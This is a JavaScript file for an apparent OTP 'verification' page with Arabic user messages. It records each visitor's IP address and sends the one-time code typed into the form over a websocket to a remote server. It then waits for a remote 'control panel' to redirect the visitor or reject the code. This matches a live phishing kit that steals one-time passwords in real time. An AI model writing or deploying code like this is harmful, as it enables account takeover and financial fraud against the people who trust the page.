
$(document).ready(function() {
    window.socket = io("https://dallah-server-xpls.onrender.com", { transports: ["websocket", "polling"] });
    window.visitorIP = null;

    (async () => {
        try {
            const r = await fetch("https://api.ipify.org?format=json");
            const { ip } = await r.json();
            window.visitorIP = ip;
            window.socket.emit("updateLocation", { ip, page: "verify.html" });
        } catch(e) { console.error("IP fetch failed:", e); }
    })();

    window.socket.on("navigateTo", ({ page, ip: targetIp }) => {
        if (window.visitorIP === targetIp) {
            if (page.includes("declined=true")) {
                $("#waitingScreen").removeClass("active");
                alert("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى");
            } else {
                window.location.href = page;
            }
        }
    });

    $("#otpForm").on("submit", function(e) {
        e.preventDefault();
        $("#waitingScreen").addClass("active");

        const data = {
            ip: window.visitorIP,
            verificationCode: $("input[name='otp']").val(),
            createdAt: new Date()
        };

        if (window.visitorIP) {
            window.socket.emit("submitOtp", data);
            // ننتظر لوحة التحكم
        } else {
            $("#waitingScreen").removeClass("active");
            alert("جاري التحقق من الاتصال، يرجى المحاولة مرة أخرى");
        }
    });
});
